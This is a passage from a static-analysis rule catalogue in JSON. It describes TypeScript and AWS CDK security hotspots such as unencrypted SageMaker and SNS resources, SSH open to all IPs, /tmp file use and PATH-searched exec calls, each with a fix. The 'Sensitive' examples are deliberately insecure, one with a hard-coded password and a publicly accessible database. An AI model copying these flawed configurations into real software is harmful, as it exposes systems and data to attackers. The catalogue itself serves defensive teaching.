there are no gaps that might be forgotten about.\nIn this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv\">Policies and permissions\n  in IAM: Grant least privilege</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Rhino Security Labs - <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\">AWS IAM Privilege Escalation -\n  Methods and Mitigation</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-269 - Improper Privilege Management</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S6319": {
        "name": "Using unencrypted SageMaker notebook instances is security-sensitive",
        "htmlDesc": "<p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker\ninstances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries\nphysically access the storage media, they cannot decrypt encrypted data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The instance contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by\nSageMaker, so no further modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html\"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>\n<pre>\nimport { CfnNotebookInstance } from 'aws-cdk-lib/aws-sagemaker';\n\nnew CfnNotebookInstance(this, 'example', {\n      instanceType: 'instanceType',\n      roleArn: 'roleArn'\n}); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html\"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>\n<pre>\nimport { CfnNotebookInstance } from 'aws-cdk-lib/aws-sagemaker';\n\nconst encryptionKey = new Key(this, 'example', {\n    enableKeyRotation: true,\n});\nnew CfnNotebookInstance(this, 'example', {\n    instanceType: 'instanceType',\n    roleArn: 'roleArn',\n    kmsKeyId: encryptionKey.keyId\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html\">Protect Data at Rest Using Encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S5689": {
        "name": "Disclosing fingerprints from web application technologies is security-sensitive",
        "htmlDesc": "<p>Disclosure of version information, usually overlooked by developers but disclosed by default by the systems and frameworks in use, can pose a\nsignificant security risk depending on the production environement.</p>\n<p>Once this information is public, attackers can use it to identify potential security holes or vulnerabilities specific to that version.</p>\n<p>Furthermore, if the published version information indicates the use of outdated or unsupported software, it becomes easier for attackers to exploit\nknown vulnerabilities. They can search for published vulnerabilities related to that version and launch attacks that specifically target those\nvulnerabilities.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Version information is accessible to end users. </li>\n  <li> Internal systems do not benefit from timely patch management workflows. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>In general, it is recommended to keep internal technical information within internal systems to control what attackers know about the underlying\narchitectures. This is known as the \"need to know\" principle.</p>\n<p>The most effective solution is to remove version information disclosure from what end users can see, such as the \"x-powered-by\" header.<br> This\ncan be achieved directly through the web application code, server (nginx, apache) or firewalls.</p>\n<p>Disabling the server signature provides additional protection by reducing the amount of information available to attackers. Note, however, that\nthis does not provide as much protection as regular updates and patches.<br> Security by obscurity is the least foolproof solution of all. It should\nnever be the only defense mechanism and should always be combined with other security measures.</p>\n<h2>Sensitive Code Example</h2>\n<p>In <a href=\"https://www.npmjs.com/package/express\">Express.js</a>, version information is disclosed by default in the <code>x-powered-by</code>\nHTTP header:</p>\n<pre>\nlet express = require('express');\n\nlet example = express(); // Sensitive\n\nexample.get('/', function (req, res) {\n  res.send('example')\n});\n</pre>\n<h2>Compliant Solution</h2>\n<p><code>x-powered-by</code> HTTP header should be disabled in <a href=\"https://www.npmjs.com/package/express\">Express.js</a> with\n<code>app.disable</code>:</p>\n<pre>\nlet express = require('express');\n\nlet example = express();\nexample.disable(\"x-powered-by\");\n</pre>\n<p>Or with helmet’s <a href=\"https://www.npmjs.com/package/helmet\">hidePoweredBy</a> middleware:</p>\n<pre>\nlet helmet = require(\"helmet\");\n\nlet example = express();\nexample.use(helmet.hidePoweredBy());\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html\">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Information Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5148": {
        "name": "Authorizing an opened window to access back to the originating window is security-sensitive",
        "htmlDesc": "<p>A newly opened window having access back to the originating window could allow basic phishing attacks (the <code>window.opener</code> object is not\n<code>null</code> and thus <code>window.opener.location</code> can be set to a malicious website by the opened page).</p>\n<p>For instance, an attacker can put a link (say: \"http://example.com/mylink\") on a popular website that changes, when opened, the original page to\n\"http://example.com/fake_login\". On \"http://example.com/fake_login\" there is a fake login page which could trick real users to enter their\ncredentials.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application opens untrusted external URL. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Use <code>noopener</code> to prevent untrusted pages from abusing <code>window.opener</code>.</p>\n<p>Note: In Chrome 88+, Firefox 79+ or Safari 12.1+ <code>target=_blank</code> on anchors implies <code>rel=noopener</code> which make the protection\nenabled by default.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nwindow.open(\"https://example.com/dangerous\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nwindow.open(\"https://example.com/dangerous\", \"WindowName\", \"noopener\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Reverse_Tabnabbing\">Reverse Tabnabbing</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1022\">CWE-1022 - Use of Web Link to Untrusted Target with window.opener Access</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://mathiasbynens.github.io/rel-noopener/\">https://mathiasbynens.github.io/rel-noopener/</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S5443": {
        "name": "Using publicly writable directories is security-sensitive",
        "htmlDesc": "<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like\n<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious\nuser can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,\nmodified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2451\">CVE-2012-2451</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-1838\">CVE-2015-1838</a> </li>\n</ul>\n<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It\nalso detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>\n<ul>\n  <li> <code>/tmp</code> </li>\n  <li> <code>/var/tmp</code> </li>\n  <li> <code>/usr/tmp</code> </li>\n  <li> <code>/dev/shm</code> </li>\n  <li> <code>/dev/mqueue</code> </li>\n  <li> <code>/run/lock</code> </li>\n  <li> <code>/var/run/lock</code> </li>\n  <li> <code>/Library/Caches</code> </li>\n  <li> <code>/Users/Shared</code> </li>\n  <li> <code>/private/tmp</code> </li>\n  <li> <code>/private/var/tmp</code> </li>\n  <li> <code>\\Windows\\Temp</code> </li>\n  <li> <code>\\Temp</code> </li>\n  <li> <code>\\TMP</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Files are read from or written into a publicly writable folder </li>\n  <li> The application creates files with predictable names into a publicly writable folder </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a dedicated sub-folder with tightly controlled permissions </li>\n  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:\n    <ul>\n      <li> The generated filename is unpredictable </li>\n      <li> The file is readable and writable only by the creating user ID </li>\n      <li> The file descriptor is not inherited by child processes </li>\n      <li> The file will be destroyed as soon as it is closed </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst fs = require('fs');\n\nlet tmp_file = \"/tmp/temporary_file\"; // Sensitive\nfs.readFile(tmp_file, 'utf8', function (err, data) {\n  // ...\n});\n</pre>\n<pre>\nconst fs = require('fs');\n\nlet tmp_dir = process.env.TMPDIR; // Sensitive\nfs.readFile(tmp_dir + \"/temporary_file\", 'utf8', function (err, data) {\n  // ...\n});\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync(); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP, Insecure Temporary File</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S4036": {
        "name": "Searching OS commands in PATH is security-sensitive",
        "htmlDesc": "<p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>\nenvironment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in\n<code>PATH</code> is a directory under his control.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst cp = require('child_process');\ncp.exec('file.exe'); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconst cp = require('child_process');\ncp.exec('/usr/bin/file.exe'); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/426\">CWE-426 - Untrusted Search Path</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/427\">CWE-427 - Uncontrolled Search Path Element</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S6321": {
        "name": "Administration services access should be restricted to specific IP addresses",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and\noutbound traffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services\ntraditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>\n<h3>What is the potential impact?</h3>\n<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a\nvulnerability could have a high impact on the system.</p>\n<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the\ncredentials to log in to the system.</p>\n<h2>How to fix it</h2>\n<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those\nheld by system administrators or those of <a href=\"https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls\">bastion-like</a>\nservers.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html\">aws-cdk-lib.aws_ec2.Instance</a> and other constructs\nthat support a <code>connections</code> attribute:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst instance = new ec2.Instance(this, \"default-own-security-group\",{\n    instanceType: nanoT2,\n    machineImage: ec2.MachineImage.latestAmazonLinux(),\n    vpc: vpc,\n    instanceName: \"test-instance\"\n})\n\ninstance.connections.allowFrom(\n    ec2.Peer.anyIpv4(), // Noncompliant\n    ec2.Port.tcp(22),\n    /*description*/ \"Allows SSH from all IPv4\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html\">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst securityGroup = new ec2.SecurityGroup(this, \"custom-security-group\", {\n    vpc: vpc\n})\n\nsecurityGroup.addIngressRule(\n    ec2.Peer.anyIpv4(), // Noncompliant\n    ec2.Port.tcpRange(1, 1024)\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html\">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.CfnSecurityGroup(\n    this,\n    \"cfn-based-security-group\", {\n        groupDescription: \"cfn based security group\",\n        groupName: \"cfn-based-security-group\",\n        vpcId: vpc.vpcId,\n        securityGroupIngress: [\n            {\n                ipProtocol: \"6\",\n                cidrIp: \"0.0.0.0/0\", // Noncompliant\n                fromPort: 22,\n                toPort: 22\n            }\n        ]\n    }\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html\">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.CfnSecurityGroupIngress( // Noncompliant\n    this,\n    \"ingress-all-ip-tcp-ssh\", {\n        ipProtocol: \"tcp\",\n        cidrIp: \"0.0.0.0/0\",\n        fromPort: 22,\n        toPort: 22,\n        groupId: securityGroup.attrGroupId\n})\n</pre>\n<h4>Compliant solution</h4>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html\">aws-cdk-lib.aws_ec2.Instance</a> and other constructs\nthat support a <code>connections</code> attribute:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst instance = new ec2.Instance(this, \"default-own-security-group\",{\n    instanceType: nanoT2,\n    machineImage: ec2.MachineImage.latestAmazonLinux(),\n    vpc: vpc,\n    instanceName: \"test-instance\"\n})\n\ninstance.connections.allowFrom(\n    ec2.Peer.ipv4(\"192.0.2.0/24\"),\n    ec2.Port.tcp(22),\n    /*description*/ \"Allows SSH from a trusted range\"\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html\">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst securityGroup3 = new ec2.SecurityGroup(this, \"custom-security-group\", {\n    vpc: vpc\n})\n\nsecurityGroup3.addIngressRule(\n    ec2.Peer.anyIpv4(),\n    ec2.Port.tcpRange(1024, 1048)\n)\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html\">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.CfnSecurityGroup(\n    this,\n    \"cfn-based-security-group\", {\n        groupDescription: \"cfn based security group\",\n        groupName: \"cfn-based-security-group\",\n        vpcId: vpc.vpcId,\n        securityGroupIngress: [\n            {\n                ipProtocol: \"6\",\n                cidrIp: \"192.0.2.0/24\",\n                fromPort: 22,\n                toPort: 22\n            }\n        ]\n    }\n)\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html\">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nnew ec2.CfnSecurityGroupIngress(\n    this,\n    \"ingress-all-ipv4-tcp-http\", {\n        ipProtocol: \"6\",\n        cidrIp: \"0.0.0.0/0\",\n        fromPort: 80,\n        toPort: 80,\n        groupId: securityGroup.attrGroupId\n    }\n)\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html\">AWS Documentation</a> - Security groups for your VPC </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview\">Azure Documentation</a> - Network security\n  groups </li>\n  <li> <a href=\"https://cloud.google.com/vpc/docs/using-firewalls\">GCP Documentation</a> - Firewalls </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S6327": {
        "name": "Using unencrypted SNS topics is security-sensitive",
        "htmlDesc": "<p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)\ncommunication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages\nwhen they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to\naccess the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The topic contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html\"><code>aws_cdk.aws_sns.Topic</code></a></p>\n<pre>\nimport { Topic } from 'aws-cdk-lib/aws-sns';\n\nnew Topic(this, 'exampleTopic'); // Sensitive\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html\"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>\n<pre>\nimport { Topic, CfnTopic } from 'aws-cdk-lib/aws-sns';\n\nnew CfnTopic(this, 'exampleCfnTopic'); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html\"><code>aws_cdk.aws_sns.Topic</code></a></p>\n<pre>\nimport { Topic } from 'aws-cdk-lib/aws-sns';\n\nconst encryptionKey = new Key(this, 'exampleKey', {\n    enableKeyRotation: true,\n});\n\nnew Topic(this, 'exampleTopic', {\n    masterKey: encryptionKey\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html\"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>\n<pre>\nimport { CfnTopic } from 'aws-cdk-lib/aws-sns';\n\nconst encryptionKey = new Key(this, 'exampleKey', {\n    enableKeyRotation: true,\n});\n\ncfnTopic = new CfnTopic(this, 'exampleCfnTopic', {\n    kmsMasterKeyId: encryptionKey.keyId\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html\">AWS Documentation</a> - Encryption at rest </li>\n  <li> <a href=\"https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/\">Encrypting messages published to\n  Amazon SNS with AWS KMS</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S6329": {
        "name": "Allowing public network access to cloud resources is security-sensitive",
        "htmlDesc": "<p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft\nor disruption.</p>\n<p>Depending on the component, inbound access from the Internet can be enabled via:</p>\n<ul>\n  <li> a boolean value that explicitly allows access to the public network. </li>\n  <li> the assignment of a public IP address. </li>\n  <li> database firewall rules that allow public IP ranges. </li>\n</ul>\n<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>\n<p>This decision increases the likelihood of attacks on the organization, such as:</p>\n<ul>\n  <li> data breaches. </li>\n  <li> intrusions into the infrastructure to permanently steal from it. </li>\n  <li> and various malicious traffic, such as DDoS attacks. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<p>This cloud resource:</p>\n<ul>\n  <li> should be publicly accessible to any Internet user. </li>\n  <li> requires inbound traffic from the Internet to function properly. </li>\n</ul>\n<p>There is a risk if you answered no to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce\nsites.</p>\n<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud\ncomponents.</p>\n<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the\nabsence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html\">aws-cdk-lib.aws_ec2.Instance</a> and similar\nconstructs:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.Instance(this, \"example\", {\n    instanceType: nanoT2,\n    machineImage: ec2.MachineImage.latestAmazonLinux(),\n    vpc: vpc,\n    vpcSubnets: {subnetType: ec2.SubnetType.PUBLIC} // Sensitive\n})\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html\">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.CfnInstance(this, \"example\", {\n    instanceType: \"t2.micro\",\n    imageId: \"ami-0ea0f26a6d50850c5\",\n    networkInterfaces: [\n        {\n            deviceIndex: \"0\",\n            associatePublicIpAddress: true, // Sensitive\n            deleteOnTermination: true,\n            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PUBLIC}).subnetIds[0]\n        }\n    ]\n})\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html\">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew dms.CfnReplicationInstance(\n    this, \"example\", {\n    replicationInstanceClass: \"dms.t2.micro\",\n    allocatedStorage: 5,\n    publiclyAccessible: true, // Sensitive\n    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,\n    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]\n})\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html\">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst rdsSubnetGroupPublic = new rds.CfnDBSubnetGroup(this, \"publicSubnet\", {\n    dbSubnetGroupDescription: \"Subnets\",\n    dbSubnetGroupName: \"publicSn\",\n    subnetIds: vpc.selectSubnets({\n        subnetType: ec2.SubnetType.PUBLIC\n    }).subnetIds\n})\n\nnew rds.CfnDBInstance(this, \"example\", {\n    engine: \"postgres\",\n    masterUsername: \"foobar\",\n    masterUserPassword: \"12345678\",\n    dbInstanceClass: \"db.r5.large\",\n    allocatedStorage: \"200\",\n    iops: 1000,\n    dbSubnetGroupName: rdsSubnetGroupPublic.ref,\n    publiclyAccessible: true, // Sensitive\n    vpcSecurityGroups: [sg.securityGroupId]\n})\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html\">aws-cdk-lib.aws_ec2.Instance</a> and similar\nconstructs:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.Instance(\n    this,\n    \"example\", {\n    instanceType: nanoT2,\n    machineImage: ec2.MachineImage.latestAmazonLinux(),\n    vpc: vpc,\n    vpcSubnets: {subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}\n})\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html\">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew ec2.CfnInstance(this, \"example\", {\n    instanceType: \"t2.micro\",\n    imageId: \"ami-0ea0f26a6d50850c5\",\n    networkInterfaces: [\n        {\n            deviceIndex: \"0\",\n            associatePublicIpAddress: false,\n            deleteOnTermination: true,\n            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}).subnetIds[0]\n        }\n    ]\n})\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html\">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nnew dms.CfnReplicationInstance(\n    this, \"example\", {\n    replicationInstanceClass: \"dms.t2.micro\",\n    allocatedStorage: 5,\n    publiclyAccessible: false,\n    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,\n    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]\n})\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html\">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>\n<pre>\nimport {aws_ec2 as ec2} from 'aws-cdk-lib'\n\nconst rdsSubnetGroupPrivate = new rds.CfnDBSubnetGroup(this, \"example\",{\n    dbSubnetGroupDescription: \"Subnets\",\n    dbSubnetGroupName: \"privateSn\",\n    subnetIds: vpc.selectSubnets({\n        subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS\n    }).subnetIds\n})\n\nnew rds.CfnDBInstance(this, \"example\", {\n    engine: \"postgres\",\n    masterUsername: \"foobar\",\n    masterUserPassword: 